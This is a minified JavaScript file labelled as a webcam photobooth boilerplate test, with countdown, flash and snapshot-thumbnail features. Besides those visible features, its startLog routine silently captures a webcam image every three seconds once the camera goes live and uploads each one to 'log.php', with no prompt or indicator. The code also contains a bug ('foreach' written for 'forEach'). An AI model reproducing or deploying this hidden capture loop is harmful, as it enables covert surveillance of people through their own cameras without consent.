/*!
 * boilerplate
 * Boilerplate Test
 * http://www.guahanweb.com
 * @author Guahan Web
 * @version 0.1.0
 * Copyright 2015. MIT licensed.
 */
!function(t,n,e,i){"use strict";function o(n){return setTimeout(function(){t.snap(function(e){t.upload(e,"log.php",function(t){n(200===t?!0:!1)})})},l)}var s,c,a,u,f,r=400,d=532,l=3e3,p=null,g={flash:!0,countdown:!0,countdown_timer:5,image_format:"jpeg",jpeg_quality:65},m={init:function(t){s=e.getElementById("snapshots"),c=e.getElementById("ss-trigger"),a=e.getElementById("counter-wrapper"),u=e.querySelector("#webcam .flash"),f=g,Object.keys(t||{}).foreach(function(n){f[n]=t[n]}),m.setup(),m.listen()},setup:function(){t.set({image_format:f.image_format,jpeg_quality:f.jpeg_quality,height:r,width:d}),t.attach("#viewport")},listen:function(){t.on("live",function(){m.startLog()}),c.addEventListener("click",function(t){t.preventDefault(),t.stopPropagation(),m.snap()})},flash:function(){f.flash&&setTimeout(function(){u.classList.remove("fading"),u.classList.remove("off"),setTimeout(function(){u.classList.add("fading"),u.classList.add("off")},20)},20)},click:function(){m.flash(),t.snap(m.appendSnapshot)},snap:function(){f.countdown?m.countdown(f.countdown_timer,m.click):m.click()},countdown:function(t,n){a.querySelector("span.digit").innerHTML=t,a.classList.remove("hidden"),0===t?(a.classList.add("hidden"),n()):setTimeout(function(){m.countdown(t-1,n)},1e3)},appendSnapshot:function(t){var n=e.createElement("IMG");n.setAttribute("src",t),n.setAttribute("height",r/2),n.setAttribute("width",d/2),s.appendChild(n)},startLog:function(){p=o(function(t){t&&m.startLog()})},stopLog:function(){clearTimeout(p)}};m.init()}(Webcam,window,document);